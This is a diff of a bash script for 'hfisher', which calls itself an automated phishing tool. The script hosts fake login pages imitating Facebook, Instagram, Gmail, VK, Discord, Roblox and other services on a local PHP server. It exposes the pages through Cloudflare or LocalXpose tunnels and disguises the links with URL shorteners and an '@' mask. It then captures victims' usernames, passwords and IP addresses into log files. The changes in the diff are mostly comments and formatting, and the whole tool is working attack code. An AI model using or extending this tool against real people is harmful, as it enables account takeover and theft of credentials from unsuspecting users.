@@ -1,8 +1,11 @@
 #!/bin/bash
+
 ##   hfisher 	: 	Automated Phishing Tool
 ##   Author 	: 	imshown 
 ##   Version 	: 	1.0.5
 ##   Github 	: 	https://github.com/hsecurities/hfisher
+
+
 ##                   GNU GENERAL PUBLIC LICENSE
 ##                    Version 3, 29 June 2007
 ##
@@ -75,15 +78,24 @@
 ##
 ##      Copyright (C) 2025  hsecurities (https://github.com/hsecurities)
 ##
+
+
 __version__="1.0.5"
+
+## DEFAULT HOST & PORT
 HOST='127.0.0.1'
-PORT='8080'
+PORT='8080' 
+
+## ANSI colors (FG & BG)
 RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
 MAGENTA="$(printf '\033[35m')"  RED="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
 REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
 MAGENTABG="$(printf '\033[45m')"  REDBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
 RESETBG="$(printf '\e[0m\n')"
+
+## Directories
 BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")
+
 if [[ ! -d ".server" ]]; then
 	mkdir -p ".server"
 fi
@@ -99,6 +111,7 @@ else
 	mkdir -p ".server/www"
 fi
 
+## Remove logfile
 if [[ -e ".server/.loclx" ]]; then
 	rm -rf ".server/.loclx"
 fi
@@ -106,21 +119,29 @@ fi
 if [[ -e ".server/.cld.log" ]]; then
 	rm -rf ".server/.cld.log"
 fi
-exit_on_signal_SIGINT(){
-	{printf "\n\n\n\n""${RED}[${WHITE}!${RED}]${RED}Program Interrupted."2>&1; reset_color;}
+
+## Script termination
+exit_on_signal_SIGINT() {
+	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
 	exit 0
 }
-exit_on_signal_SIGTERM(){
-	{printf "\n\n\n\n""${RED}[${WHITE}!${RED}]${RED}Program Terminated."2>&1; reset_color;}
+
+exit_on_signal_SIGTERM() {
+	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
 	exit 0
 }
+
 trap exit_on_signal_SIGINT SIGINT
 trap exit_on_signal_SIGTERM SIGTERM
+
+## Reset terminal colors
 reset_color() {
-	tput sgr0
-	tput op
+	tput sgr0   # reset attributes
+	tput op     # reset color
 	return
 }
+
+## Kill already running process
 kill_pid() {
 	check_PID="php cloudflared loclx"
 	for process in ${check_PID}; do
@@ -129,11 +150,14 @@ kill_pid() {
 		fi
 	done
 }
+
+# Check for a newer release
 check_update(){
 	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Checking for update : "
 	relase_url='https://api.github.com/repos/hsecurities/hfisher/releases/latest'
 	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
 	tarball_url="https://github.com/hsecurities/hfisher/archive/refs/tags/${new_version}.tar.gz"
+
 	if [[ $new_version != $__version__ ]]; then
 		echo -ne "${ORANGE}update found\n"${WHITE}
 		sleep 2
@@ -141,6 +165,7 @@ check_update(){
 		pushd "$HOME" > /dev/null 2>&1
 		curl --silent --insecure --fail --retry-connrefused \
 		--retry 3 --retry-delay 2 --location --output ".hfisher.tar.gz" "${tarball_url}"
+
 		if [[ -e ".hfisher.tar.gz" ]]; then
 			tar -xf .hfisher.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
 			[ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Error occured while extracting."; reset_color; exit 1; }
@@ -157,11 +182,15 @@ check_update(){
 		echo -ne "${GREEN}up to date\n${WHITE}" ; sleep .5
 	fi
 }
+
+## Check Internet Status
 check_status() {
 	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Internet Status : "
 	timeout 3s curl -fIs "https://api.github.com" > /dev/null
 	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}"
 }
+
+## Banner
 banner() {
 	cat <<- EOF
 		${BLUE}
@@ -171,9 +200,13 @@ banner() {
 		${BLUE}|   Y  \|     \   |  |\___ \|   Y  \  ___/|  | \/
 		${BLUE}|___|  /\___  /   |__/____  >___|  /\___  >__|   
 		${BLUE}\/     \/            \/     \/     \/ ${RED}Version : ${__version__}      
+
+
 		${GREEN}[${WHITE}-${BLUE}]${RED} Tool Created by hsecurities (imshown)${WHITE}
 	EOF
 }
+
+## Small Banner
 banner_small() {
 	cat <<- EOF
 		${RED}
@@ -187,6 +220,8 @@ banner_small() {
 		${RED}|_||_||_|    |_|/__/|_||_|\___| |_|   
 	EOF
 }
+
+## Dependencies
 dependencies() {
 	echo -e "\n${GREEN}[${WHITE}+${ORANGE}]${RED} Installing required packages..."
 
@@ -229,6 +264,8 @@ dependencies() {
 		done
 	fi
 }
+
+# Download Binaries
 download() {
 	url="$1"
 	output="$2"
@@ -256,6 +293,8 @@ download() {
 		{ reset_color; exit 1; }
 	fi
 }
+
+## Install Cloudflared
 install_cloudflared() {
 	if [[ -e ".server/cloudflared" ]]; then
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
@@ -273,6 +312,8 @@ install_cloudflared() {
 		fi
 	fi
 }
+
+## Install LocalXpose
 install_localxpose() {
 	if [[ -e ".server/loclx" ]]; then
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
@@ -290,11 +331,15 @@ install_localxpose() {
 		fi
 	fi
 }
+
+## Exit message
 msg_exit() {
 	{ clear; banner; echo; }
 	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
 	{ reset_color; exit 0; }
 }
+
+## About
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
@@ -329,6 +374,8 @@ about() {
 			{ sleep 1; about; };;
 	esac
 }
+
+## Choose custom port
 cusport() {
 	echo
 	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do You Want A Custom Port ${GREEN}[${RED}y${GREEN}/${RED}N${GREEN}]: ${ORANGE}" P_ANS
@@ -346,6 +393,8 @@ cusport() {
 		echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Using Default Port $PORT...${WHITE}\n"
 	fi
 }
+
+## Setup website and start php server
 setup_site() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
 	cp -rf .sites/"$website"/* .server/www
@@ -353,6 +402,8 @@ setup_site() {
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
 	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
 }
+
+## Get IP address
 capture_ip() {
 	IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
 	IFS=$'\n'
@@ -360,6 +411,8 @@ capture_ip() {
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
 	cat .server/www/ip.txt >> auth/ip.txt
 }
+
+## Get credentials
 capture_creds() {
 	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
 	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
@@ -370,6 +423,8 @@ capture_creds() {
 	cat .server/www/usernames.txt >> auth/usernames.dat
 	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
 }
+
+## Print data
 capture_data() {
 	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
 	while true; do
@@ -387,6 +442,8 @@ capture_data() {
 		sleep 0.75
 	done
 }
+
+## Start Cloudflared
 start_cloudflared() { 
 	rm .cld.log > /dev/null 2>&1 &
 	cusport
@@ -405,6 +462,7 @@ start_cloudflared() {
 	custom_url "$cldflr_url"
 	capture_data
 }
+
 localxpose_auth() {
 	./.server/loclx -help > /dev/null 2>&1 &
 	sleep 1
@@ -421,6 +479,8 @@ localxpose_auth() {
 		}
 	}
 }
+
+## Start LocalXpose (Again...)
 start_loclx() {
 	cusport
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${RED}http://$HOST:$PORT ${GREEN})"
@@ -441,6 +501,8 @@ start_loclx() {
 	custom_url "$loclx_url"
 	capture_data
 }
+
+## Start localhost
 start_localhost() {
 	cusport
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${RED}http://$HOST:$PORT ${GREEN})"
@@ -449,6 +511,8 @@ start_localhost() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${RED}http://$HOST:$PORT ${GREEN}"
 	capture_data
 }
+
+## Tunnel selection
 tunnel_menu() {
 	{ clear; banner_small; }
 	cat <<- EOF
@@ -473,6 +537,8 @@ tunnel_menu() {
 			{ sleep 1; tunnel_menu; };;
 	esac
 }
+
+## Custom Mask URL
 custom_mask() {
 	{ sleep .5; clear; banner_small; echo; }
 	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want to change Mask URL? ${GREEN}[${RED}y${GREEN}/${RED}N${GREEN}] :${ORANGE} " mask_op
@@ -488,6 +554,8 @@ custom_mask() {
 		fi
 	fi
 }
+
+## URL Shortner
 site_stat() { [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"; }
 
 shorten() {
@@ -495,14 +563,17 @@ shorten() {
 	if [[ "$1" == *"shrtco.de"* ]]; then
 		processed_url=$(echo ${short} | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
 	else
+		# processed_url=$(echo "$short" | awk -F// '{print $NF}')
 		processed_url=${short#http*//}
 	fi
 }
+
 custom_url() {
 	url=${1#http*//}
 	isgd="https://is.gd/create.php?format=simple&url="
 	shortcode="https://api.shrtco.de/v2/shorten?url="
 	tinyurl="https://tinyurl.com/api-create.php?url="
+
 	{ custom_mask; sleep 1; clear; banner_small; }
 	if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|loclx.io) ]]; then
 		if [[ $(site_stat $isgd) == 2* ]]; then
@@ -512,6 +583,7 @@ custom_url() {
 		else
 			shorten $tinyurl "$url"
 		fi
+
 		url="https://$url"
 		masked_url="$mask@$processed_url"
 		processed_url="https://$processed_url"
@@ -520,10 +592,13 @@ custom_url() {
 		url="Unable to generate links. Try after turning on hotspot"
 		processed_url="Unable to Short URL"
 	fi
+
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url"
 	[[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
 }
+
+## Facebook
 site_facebook() {
 	cat <<- EOF
 
@@ -531,8 +606,11 @@ site_facebook() {
 		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
 		${RED}[${WHITE}03${RED}]${ORANGE} Fake Security Login Page
 		${RED}[${WHITE}04${RED}]${ORANGE} Facebook Messenger Login Page
+
 	EOF
+
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+
 	case $REPLY in 
 		1 | 01)
 			website="facebook"
@@ -555,14 +633,20 @@ site_facebook() {
 			{ sleep 1; clear; banner_small; site_facebook; };;
 	esac
 }
+
+## Instagram
 site_instagram() {
 	cat <<- EOF
+
 		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
 		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page
 		${RED}[${WHITE}03${RED}]${ORANGE} 1000 Followers Login Page
 		${RED}[${WHITE}04${RED}]${ORANGE} Blue Badge Verify Login Page
+
 	EOF
+
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+
 	case $REPLY in 
 		1 | 01)
 			website="instagram"
@@ -585,13 +669,19 @@ site_instagram() {
 			{ sleep 1; clear; banner_small; site_instagram; };;
 	esac
 }
+
+## Gmail/Google
 site_gmail() {
 	cat <<- EOF
+
 		${RED}[${WHITE}01${RED}]${ORANGE} Gmail Old Login Page
 		${RED}[${WHITE}02${RED}]${ORANGE} Gmail New Login Page
 		${RED}[${WHITE}03${RED}]${ORANGE} Advanced Voting Poll
+
 	EOF
+
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+
 	case $REPLY in 
 		1 | 01)
 			website="google"
@@ -610,12 +700,18 @@ site_gmail() {
 			{ sleep 1; clear; banner_small; site_gmail; };;
 	esac
 }
+
+## Vk
 site_vk() {
 	cat <<- EOF
+
 		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
 		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
+
 	EOF
+
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+
 	case $REPLY in 
 		1 | 01)
 			website="vk"
@@ -630,6 +726,8 @@ site_vk() {
 			{ sleep 1; clear; banner_small; site_vk; };;
 	esac
 }
+
+## Menu
 main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
@@ -649,8 +747,11 @@ main_menu() {
 		${RED}[${WHITE}34${RED}]${ORANGE} Discord       ${RED}[${WHITE}35${RED}]${ORANGE} Roblox 
 
 		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
+
 	EOF
+	
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+
 	case $REPLY in 
 		1 | 01)
 			site_facebook;;
@@ -791,8 +892,11 @@ main_menu() {
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; main_menu; };;
+	
 	esac
 }
+
+## Main
 kill_pid
 dependencies
 check_status
